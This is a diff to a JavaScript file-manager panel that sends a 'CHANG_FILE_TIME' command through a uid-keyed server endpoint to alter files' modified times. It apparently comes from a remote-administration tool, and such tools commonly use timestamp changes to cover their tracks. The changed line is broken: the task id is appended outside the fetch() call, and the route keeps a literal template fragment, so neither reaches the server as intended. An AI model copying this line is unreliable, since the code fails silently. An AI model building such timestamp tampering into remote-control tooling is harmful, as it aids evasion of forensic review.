@@ -408,7 +408,7 @@ class index{
                     const newTime = prompt("Enter the new modified time (format: YYYY-MM-DD HH:mm:ss):");
                     if (newTime) {
                         const cmd = "CHANG_FILE_TIME^" + currentName + "^" + newTime;
-                        fetch(this.server + "/user_index?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd));
+                        fetch(this.server + "/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd))+"&Taskid="+TaskId;
                         new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
                     }
                 });
